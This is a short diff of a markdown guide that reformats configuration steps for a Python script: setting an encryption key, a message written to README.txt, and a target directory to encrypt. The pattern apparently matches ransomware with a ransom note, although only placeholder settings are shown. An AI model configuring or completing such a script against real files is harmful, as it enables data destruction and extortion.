@@ -13,16 +13,12 @@
 # Specify your encryption key here
 encryption_key = b'YourEncryptionKey'  # Replace 'Your Encryption Key' with the desired encryption key.
 
-<h2> Also change the message for the README.txt file </h2>
-
-```python
+# Change the message for the README.txt file
 f.write(b'Your message')
 
-<h2> Change the target directory to encrypt files </h2>
-
-```python
 # Define the directory path here (replace with your desired directory)
 directory = '/path/to/your/directory'  # Replace it '/path/to/your/directory' with the directory path you want to encrypt.
+```
 
 <i>How this code works</i>
 
